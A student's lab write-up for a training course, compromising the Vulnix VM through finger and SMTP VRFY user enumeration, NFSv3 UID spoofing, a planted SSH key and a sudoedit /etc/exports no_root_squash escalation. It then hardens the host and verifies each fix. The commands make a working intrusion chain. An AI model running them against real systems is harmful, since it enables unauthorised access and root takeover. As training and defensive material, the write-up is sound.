<!-- Robin Reinhardt | Cybersteps - Modul 2 - Project 5 -->

# Project 5 - Think inside the box

## Part A

**Vulnix VM**
IP: 10.10.10.130
MAC: 00:0C:29:08:87:3C
OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)

| Port | Dienst | why interesting |
| --- | --- | --- |
| 79 |  finger | user-enumeration |
| 25 | SMTP (Postfix) | VRFY is active - user-enumeration |
| 111 + 2049 + mounted | rpcbind / NFS | NFS-exports + false export-config |
| 22 | SSH | foothold |
| 512 / 513 / 514 | exec / login / shell | "r-services" (rexec, rlogin, rsh). very old, trust based|

### Phase 1 - Reconnaissance
**Host Discovery**
Command
```
nmap -sn 10.10.10.0/24
```
Result:
```
Nmap scan report for 10.10.10.130
Host is up (0.00042s latency).
MAC Address: 00:0C:29:08:87:3C (VMware)
```

**Portscan + Servies**
Command
```
sudo nmap -p- -sV -sC -T4 -oA vulnix_scan 10.10.10.130
```
Result:
```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-12 12:51 +0200
Nmap scan report for 10.10.10.130
Host is up (0.0028s latency).
Not shown: 65518 closed tcp ports (reset)
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 10:cd:9e:a0:e4:e0:30:24:3e:bd:67:5f:75:4a:33:bf (DSA)
|   2048 bc:f9:24:07:2f:cb:76:80:0d:27:a6:48:52:0a:24:3a (RSA)
|_  256 4d:bb:4a:c1:18:e8:da:d1:82:6f:58:52:9c:ee:34:5f (ECDSA)
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: vulnix, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
| ssl-cert: Subject: commonName=vulnix
| Not valid before: 2012-09-02T17:40:12
|_Not valid after:  2022-08-31T17:40:12
|_ssl-date: 2026-07-12T10:54:34+00:00; 0s from scanner time.
79/tcp    open  finger     Linux fingerd
|_finger: No one logged on.\x0D
110/tcp   open  pop3?
| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server
| Not valid before: 2012-09-02T17:40:22
|_Not valid after:  2022-09-02T17:40:22
|_ssl-date: 2026-07-12T10:54:34+00:00; 0s from scanner time.
111/tcp   open  rpcbind    2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100005  1,2,3      33306/udp   mountd
|   100005  1,2,3      43441/tcp6  mountd
|   100005  1,2,3      47226/tcp   mountd
|   100005  1,2,3      48494/udp6  mountd
|   100021  1,3,4      34917/tcp   nlockmgr
|   100021  1,3,4      43973/udp   nlockmgr
|   100021  1,3,4      58034/udp6  nlockmgr
|   100021  1,3,4      58178/tcp6  nlockmgr
|   100024  1          38788/tcp6  status
|   100024  1          47985/tcp   status
|   100024  1          49510/udp   status
|   100024  1          50601/udp6  status
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
143/tcp   open  imap       Dovecot imapd
|_ssl-date: 2026-07-12T10:54:34+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server
| Not valid before: 2012-09-02T17:40:22
|_Not valid after:  2022-09-02T17:40:22
512/tcp   open  exec       netkit-rsh rexecd
513/tcp   open  login?
514/tcp   open  tcpwrapped
993/tcp   open  ssl/imap   Dovecot imapd
| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server
| Not valid before: 2012-09-02T17:40:22
|_Not valid after:  2022-09-02T17:40:22
|_ssl-date: 2026-07-12T10:54:34+00:00; 0s from scanner time.
995/tcp   open  ssl/pop3s?
|_ssl-date: 2026-07-12T10:54:34+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server
| Not valid before: 2012-09-02T17:40:22
|_Not valid after:  2022-09-02T17:40:22
2049/tcp  open  nfs_acl    2-3 (RPC #100227)
34917/tcp open  nlockmgr   1-4 (RPC #100021)
42615/tcp open  mountd     1-3 (RPC #100005)
46622/tcp open  mountd     1-3 (RPC #100005)
47226/tcp open  mountd     1-3 (RPC #100005)
47985/tcp open  status     1 (RPC #100024)
MAC Address: 00:0C:29:08:87:3C (VMware)
Service Info: Host:  vulnix; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 197.82 seconds
```

**NFS - what is exported?**
Command
```
showmount -e 10.10.10.130
```
Result:
```
Export list for 10.10.10.130:
/home/vulnix *
```


**finger**
Command
```
finger vulnix@10.10.10.130
```
Result:
```
Login: vulnix                           Name:
Directory: /home/vulnix                 Shell: /bin/bash
Never logged in.
No mail.
No Plan.
```

Command
```
finger root@10.10.10.130
```
Result:
```
Login: root                             Name: root
Directory: /root                        Shell: /bin/bash
Never logged in.
No mail.
No Plan.
```

Command
```
finger user@10.10.10.130
```
Result:
```
Login: user                             Name: user
Directory: /home/user                   Shell: /bin/bash
Never logged in.
No mail.
No Plan.

Login: dovenull                         Name: Dovecot login user
Directory: /nonexistent                 Shell: /bin/false
Never logged in.
No mail.
No Plan.
```

**SMTP - VRFY**
***Establish connection***
Command
```
nc 10.10.10.130 25
```
Result:
```
220 vulnix ESMTP Postfix (Ubuntu)
```
***Connection opened - try to VRFY users***

Command
```
VRFY vulnix
```
Result:
```
252 2.0.0 vulnix
```

Command
```
VRFY user
```
Result:
```
252 2.0.0 user
```

***close connection***
Command
```
quit
```
Result:
```
221 2.0.0 Bye
```



### Phase 2 - Gaining a Foothold

2 Options - SSH or NFS
NFS is more silent and we had learned about UID spoofing - so I choose NFS

**Try to get UID**
nmap nfs-ls tested – because root_squash + 750-rights no UID-Leak possible, try to get UID via local UID-Matching enumeration."


**Enumeration UID**
Command
```
for uid in $(seq 1000 2050); do
  sudo useradd -u "$uid" -M -s /bin/false testuser 2>/dev/null
  if sudo -u testuser ls /mnt/vulnix >/dev/null 2>&1; then
    echo ">>> MATCH: UID $uid can go inside <<<"
    break
  fi
  sudo userdel testuser 2>/dev/null
done
```
Result:
```
>>> MATCH: UID $uid can go inside <<<
```


**NFS Mounten**

```
sudo mount -t nfs 10.10.10.130:/home/vulnix /mnt/vulnix
```

**Take a look**

Command
```
sudo -u testuser ls -la /mnt/vulnix
```
Result
```
total 20
drwxr-x--- 2 nobody nogroup 4096 Sep  2  2012 .
drwxr-xr-x 3 root   root    4096 Jul 12 14:46 ..
-rw-r--r-- 1 nobody nogroup  220 Apr  3  2012 .bash_logout
-rw-r--r-- 1 nobody nogroup 3486 Apr  3  2012 .bashrc
-rw-r--r-- 1 nobody nogroup  675 Apr  3  2012 .profile
```

**User check**
Command:
```
id testuser
```
Result:
```
uid=2008(testuser) gid=2008(testuser) groups=2008(testuser)
```

**Mount check**
Command:
```
mount | grep vulnix
```
Result:
```
10.10.10.130:/home/vulnix on /mnt/vulnix type nfs4 (rw,relatime,vers=4.0,rsize=65536,wsize=65536,namlen=255,hard,fatal_neterrors=none,proto=tcp,timeo=600,retrans=2,sec=sys,clientaddr=10.10.10.129,local_lock=none,addr=10.10.10.130)
```

***Mounted with version 4 - but version 3 is needed for uid spoofing***
***-> Donwgrade version for mount***

Command:
```
sudo mount -t nfs -o vers=3 10.10.10.130:/home/vulnix /mnt/vulnix
```
Result:
```
Created symlink '/run/systemd/system/remote-fs.target.wants/rpc-statd.service' → '/usr/lib/systemd/system/rpc-statd.service'.
```


**Mount check**
Command:
```
mount | grep vulnix
```
Result:
```
10.10.10.130:/home/vulnix on /mnt/vulnix type nfs (rw,relatime,vers=3,rsize=65536,wsize=65536,namlen=255,hard,fatal_neterrors=none,proto=tcp,timeo=600,retrans=2,sec=sys,mountaddr=10.10.10.130,mountvers=3,mountport=33306,mountproto=udp,local_lock=none,addr=10.10.10.130)
```

***Correct vulnerable version for UID spoofing***


***Take a look again***

Command:
```
sudo -u testuser ls -la /mnt/vulnix
```
Result:
```
total 20
drwxr-x--- 2 testuser testuser 4096 Sep  2  2012 .
drwxr-xr-x 3 root     root     4096 Jul 12 14:46 ..
-rw-r--r-- 1 testuser testuser  220 Apr  3  2012 .bash_logout
-rw-r--r-- 1 testuser testuser 3486 Apr  3  2012 .bashrc
-rw-r--r-- 1 testuser testuser  675 Apr  3  2012 .profile
```

-> Create a SSH key and place it on the machine

Create a directory
Command:
```
sudo -u testuser mkdir -p /mnt/vulnix/.ssh
```

Create a SSH key
Command:
```
ssh-keygen -t ed25519 -f ~/vulnix_key -N ""
```
Result:
```
Generating public/private ed25519 key pair.
Your identification has been saved in /home/kali/vulnix_key
Your public key has been saved in /home/kali/vulnix_key.pub
...
```

**Copy the Key to the machine**
Command:
```
sudo -u testuser cp ~/vulnix_key.pub /mnt/vulnix/.ssh/authorized_keys
```
Result:
```
cp: cannot stat '/home/kali/vulnix_key.pub': Permission denied
```

***-> testuser is not allowed to copy from /home/kali***

*Copy to /tmp and then to the machine*
```
cp ~/vulnix_key.pub /tmp/vulnix_key.pub
```
*Make it readable for everyone*
```
chmod 644 /tmp/vulnix_key.pub
```
*Copy SSH key to the machine*
```
sudo -u testuser cp /tmp/vulnix_key.pub /mnt/vulnix/.ssh/authorized_keys
```

**Set permissions for vulnix - so that SSH works**
*Only vulnix can enter the folder*
```
sudo -u testuser chmod 700 /mnt/vulnix/.ssh
```
*Only vulnix can read / write the file*
```
sudo -u testuser chmod 600 /mnt/vulnix/.ssh/authorized_keys
```

Cleanup - remove pub key from /tmp
```
rm /tmp/vulnix_key.pub
```

Login via SSH
Command:
```
ssh -i ~/vulnix_key vulnix@10.10.10.130
```
Result:
```
The authenticity of host '10.10.10.130 (10.10.10.130)' can't be established.
ECDSA key fingerprint is: SHA256:IGOuLMZRTuUvY58a8TN+ef/1zyRCAHk0qYP4wMViOAg
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.130' (ECDSA) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
vulnix@10.10.10.130's password:
```

Try with verbose output
Command:
```
ssh -v -i ~/vulnix_key vulnix@10.10.10.130
```
Result:
```
debug1: OpenSSH_10.3p1 Debian-2, OpenSSL 3.6.2 7 Apr 2026
debug1: Reading configuration data /home/kali/.ssh/config
debug1: Reading configuration data /etc/ssh/ssh_config
debug1: Reading configuration data /etc/ssh/ssh_config.d/20-systemd-ssh-proxy.conf
debug1: /etc/ssh/ssh_config line 21: Applying options for *
debug1: Connecting to 10.10.10.130 [10.10.10.130] port 22.
debug1: Connection established.
debug1: loaded pubkey from /home/kali/vulnix_key: ED25519 SHA256:3bx+DIhD2VTF18YzWylgYwM7s0QgzOHsu0KP89Dgb2A <--------- It founds the key
debug1: identity file /home/kali/vulnix_key type 2
debug1: no identity pubkey loaded from /home/kali/vulnix_key
debug1: Local version string SSH-2.0-OpenSSH_10.3p1 Debian-2
debug1: Remote protocol version 2.0, remote software version OpenSSH_5.9p1 Debian-5ubuntu1 <------- Old Version
debug1: compat_banner: match: OpenSSH_5.9p1 Debian-5ubuntu1 pat OpenSSH_5* compat 0x0c000002
debug1: Authenticating to 10.10.10.130:22 as 'vulnix'
debug1: load_hostkeys: fopen /home/kali/.ssh/known_hosts2: No such file or directory
debug1: load_hostkeys: fopen /etc/ssh/ssh_known_hosts: No such file or directory
debug1: load_hostkeys: fopen /etc/ssh/ssh_known_hosts2: No such file or directory
debug1: SSH2_MSG_KEXINIT sent
debug1: SSH2_MSG_KEXINIT received
debug1: kex: algorithm: ecdh-sha2-nistp256
debug1: kex: host key algorithm: ecdsa-sha2-nistp256
debug1: kex: server->client cipher: aes128-ctr MAC: umac-64@openssh.com compression: none
debug1: kex: client->server cipher: aes128-ctr MAC: umac-64@openssh.com compression: none
debug1: expecting SSH2_MSG_KEX_ECDH_REPLY
debug1: SSH2_MSG_KEX_ECDH_REPLY received
debug1: Server host key: ecdsa-sha2-nistp256 SHA256:IGOuLMZRTuUvY58a8TN+ef/1zyRCAHk0qYP4wMViOAg
debug1: load_hostkeys: fopen /home/kali/.ssh/known_hosts2: No such file or directory
debug1: load_hostkeys: fopen /etc/ssh/ssh_known_hosts: No such file or directory
debug1: load_hostkeys: fopen /etc/ssh/ssh_known_hosts2: No such file or directory
debug1: Host '10.10.10.130' is known and matches the ECDSA host key.
debug1: Found key in /home/kali/.ssh/known_hosts:12
debug1: rekey out after 4294967296 blocks
debug1: SSH2_MSG_NEWKEYS sent
debug1: expecting SSH2_MSG_NEWKEYS
debug1: SSH2_MSG_NEWKEYS received
debug1: rekey in after 4294967296 blocks
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
debug1: SSH2_MSG_SERVICE_ACCEPT received
debug1: Authentications that can continue: publickey,password
debug1: Next authentication method: publickey
debug1: Will attempt key: /home/kali/vulnix_key ED25519 SHA256:3bx+DIhD2VTF18YzWylgYwM7s0QgzOHsu0KP89Dgb2A explicit
debug1: Offering public key: /home/kali/vulnix_key ED25519 SHA256:3bx+DIhD2VTF18YzWylgYwM7s0QgzOHsu0KP89Dgb2A explicit
debug1: Authentications that can continue: publickey,password
debug1: Next authentication method: password
vulnix@10.10.10.130's password
```

Try with RSA

Command:
```
ssh-keygen -t rsa -b 2048 -f ~/vulnix_rsa -N ""
```
Result:
```
Generating public/private rsa key pair.
Your identification has been saved in /home/kali/vulnix_rsa
Your public key has been saved in /home/kali/vulnix_rsa.pub
...
```

Copy, move, change permissions
```
cp ~/vulnix_rsa.pub /tmp/vulnix_rsa.pub
chmod 644 /tmp/vulnix_rsa.pub
sudo -u testuser cp /tmp/vulnix_rsa.pub /mnt/vulnix/.ssh/authorized_keys
sudo -u testuser chmod 600 /mnt/vulnix/.ssh/authorized_keys
```

Check
```
sudo -u testuser cat /mnt/vulnix/.ssh/authorized_keys
```
Keys is there.

Try again
Command:
```
ssh -i ~/vulnix_rsa vulnix@10.10.10.130
```
Result:
```
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
vulnix@10.10.10.130's password:
```

What the ...

Command:
```
ssh -v -i ~/vulnix_rsa vulnix@10.10.10.130
```
Result:
```
debug1: OpenSSH_10.3p1 Debian-2, OpenSSL 3.6.2 7 Apr 2026
debug1: Reading configuration data /home/kali/.ssh/config
debug1: Reading configuration data /etc/ssh/ssh_config
debug1: Reading configuration data /etc/ssh/ssh_config.d/20-systemd-ssh-proxy.conf
debug1: /etc/ssh/ssh_config line 21: Applying options for *
debug1: Connecting to 10.10.10.130 [10.10.10.130] port 22.
debug1: Connection established.
debug1: loaded pubkey from /home/kali/vulnix_rsa: RSA SHA256:xbINbdtTztAhgALu6sjm9REmmWXrvobl32NUkcCKd3E <----------- It founds the key
debug1: identity file /home/kali/vulnix_rsa type 0
debug1: no identity pubkey loaded from /home/kali/vulnix_rsa
debug1: Local version string SSH-2.0-OpenSSH_10.3p1 Debian-2
debug1: Remote protocol version 2.0, remote software version OpenSSH_5.9p1 Debian-5ubuntu1
debug1: compat_banner: match: OpenSSH_5.9p1 Debian-5ubuntu1 pat OpenSSH_5* compat 0x0c000002 <------ Still because the old version?
debug1: Authenticating to 10.10.10.130:22 as 'vulnix'
debug1: load_hostkeys: fopen /home/kali/.ssh/known_hosts2: No such file or directory
debug1: load_hostkeys: fopen /etc/ssh/ssh_known_hosts: No such file or directory
debug1: load_hostkeys: fopen /etc/ssh/ssh_known_hosts2: No such file or directory
debug1: SSH2_MSG_KEXINIT sent
debug1: SSH2_MSG_KEXINIT received
debug1: kex: algorithm: ecdh-sha2-nistp256
debug1: kex: host key algorithm: ecdsa-sha2-nistp256
debug1: kex: server->client cipher: aes128-ctr MAC: umac-64@openssh.com compression: none
debug1: kex: client->server cipher: aes128-ctr MAC: umac-64@openssh.com compression: none
debug1: expecting SSH2_MSG_KEX_ECDH_REPLY
debug1: SSH2_MSG_KEX_ECDH_REPLY received
debug1: Server host key: ecdsa-sha2-nistp256 SHA256:IGOuLMZRTuUvY58a8TN+ef/1zyRCAHk0qYP4wMViOAg
debug1: load_hostkeys: fopen /home/kali/.ssh/known_hosts2: No such file or directory
debug1: load_hostkeys: fopen /etc/ssh/ssh_known_hosts: No such file or directory
debug1: load_hostkeys: fopen /etc/ssh/ssh_known_hosts2: No such file or directory
debug1: Host '10.10.10.130' is known and matches the ECDSA host key.
debug1: Found key in /home/kali/.ssh/known_hosts:12
debug1: rekey out after 4294967296 blocks
debug1: SSH2_MSG_NEWKEYS sent
debug1: expecting SSH2_MSG_NEWKEYS
debug1: SSH2_MSG_NEWKEYS received
debug1: rekey in after 4294967296 blocks
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
debug1: SSH2_MSG_SERVICE_ACCEPT received
debug1: Authentications that can continue: publickey,password
debug1: Next authentication method: publickey
debug1: Will attempt key: /home/kali/vulnix_rsa RSA SHA256:xbINbdtTztAhgALu6sjm9REmmWXrvobl32NUkcCKd3E explicit
debug1: Offering public key: /home/kali/vulnix_rsa RSA SHA256:xbINbdtTztAhgALu6sjm9REmmWXrvobl32NUkcCKd3E explicit
debug1: send_pubkey_test: no mutual signature algorithm
debug1: Next authentication method: password
vulnix@10.10.10.130's password:
```

5.9p1 is very old and kali has a modern OpenSSH 10.3 Client

Downgrade the connection
Command:
```
ssh -i ~/vulnix_rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa -o HostKeyAlgorithms=+ssh-rsa vulnix@10.10.10.130
```
Result:
```
ssh -i ~/vulnix_rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa -o HostKeyAlgorithms=+ssh-rsa vulnix@10.10.10.130
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Welcome to Ubuntu 12.04.1 LTS (GNU/Linux 3.2.0-29-generic-pae i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Mon Jul 13 15:48:31 BST 2026

  System load:  0.0              Processes:           89
  Usage of /:   84.5% of 773MB   Users logged in:     0
  Memory usage: 9%               IP address for eth0: 10.10.10.130
  Swap usage:   0%

  Graph this data and manage this system at https://landscape.canonical.com/


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

vulnix@vulnix:~$
```

***I'm inside.***

Command: (as vulnix)
```
id
```
Result:
```
uid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix)
```
Command:
```
sudo -l
```
Result:
```
Matching 'Defaults' entries for vulnix on this host:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User vulnix may run the following commands on this host:
    (root) sudoedit /etc/exports, (root) NOPASSWD: sudoedit /etc/exports
```


The user can edit /etc/exports - with sudoedit and without password.
Sudoedit is a secure tool but allows access to a mighty file, which is not neccessary.
**This hurts the priciple of least privilige.**

### Phase 3 - Privilege Escalation

**Edit /etc/exports**
add the line /root *(rw,no_root_squash)
-> Root access

Restart the VM - In RL I would have to wait for it.

So I would u a watchdog for showmount like
```
watch -n 3 'showmount -e 10.10.10.130'
```

### Phase 4 - Getting the flag
Mount
```
sudo mount -t nfs -o vers=3 10.10.10.130:/root /mnt/root
```
List
```
sudo ls /mnt/root
```
trophy.txt

Read
```
sudo cat /mnt/root/trophy.txt
```
### Flag:
```
cc614640424f5bd60ce5d5264899c3be
```

## Part B

### Create SSH access for root
to be able to execute the script

**SSH Key for root**
sudo mkdir -p /mnt/root/.ssh
sudo cp ~/vulnix_rsa.pub /mnt/root/.ssh/authorized_keys
sudo chmod 700 /mnt/root/.ssh
sudo chmod 600 /mnt/root/.ssh/authorized_keys

### Create Script
Script in pseudocode:
- deactivate fingerd -> stop enumeration
- deactivate VRFY in postfix -> stop enumeration
- deinstall r-services -> possible foothold
- restrict nfs export to specific IPs (no wildcard) -> foolthold
- remove my no_root_squah
- disable NFSv3
- remove overprivileged unneccessary sudoedit on /etc/exports -> least privilege

*If it is not possible to deactivate NFSv3 (where uid-spoofing is possible) all_squash still works and everyone is nobody (Defense in Depth) - redundancy.*

**Wrote the script, ran the script, test to get in again:**

### Test after script execution
**Can vulnix edit /etc/exports?**
Command: (Logged in via SSH as vulnix)
```
sudo -l
```
Result:
```
[sudo] password for vulnix:
```
*-> No sudoedit possible*

**Is it possible to enumerate users by fingerd**
Command: (All following from kali)
```
finger vulnix@10.10.10.130
```
Result:
```
finger: connect: Connection refused
```
*-> No.*

**Is it possible to enumerate users by SMTP VRFY?**
Command:
```
nc 10.10.10.130 25
```
Rsuelt:
```
220 vulnix ESMTP Postfix (Ubuntu)
```
Command:
```
VRFY vulnix
```
Result:
```
502 5.5.1 VRFY command is disabled
```
Command:
```
quit
````
Result:
```
221 2.0.0 Bye
```
*-> No. Gap closed*

**Are the r-services still active?**
Command:
```
nmap -p 79,512,513,514 10.10.10.130
```
Result:
```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-13 22:20 +0200
Nmap scan report for 10.10.10.130
Host is up (0.00084s latency).

PORT    STATE  SERVICE
79/tcp  closed finger
512/tcp closed exec
513/tcp closed login
514/tcp closed shell
MAC Address: 00:0C:29:08:87:3C (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.64 seconds
```
*-> No. Services disabled*

**Is it possible to mount with NFSv3?**
Command:
```
showmount -e 10.10.10.130
```
Result:
```
Export list for 10.10.10.130:
/home/vulnix 10.10.10.0/24
```
Command:
```
sudo mount -t nfs -o vers=3 10.10.10.130:/home/vulnix /mnt/vulnix
```
Result:
```
mount.nfs: Protocol not supported for 10.10.10.130:/home/vulnix on /mnt/vulnix
```
*-> No. Now you can't downgrade the protocol anymore*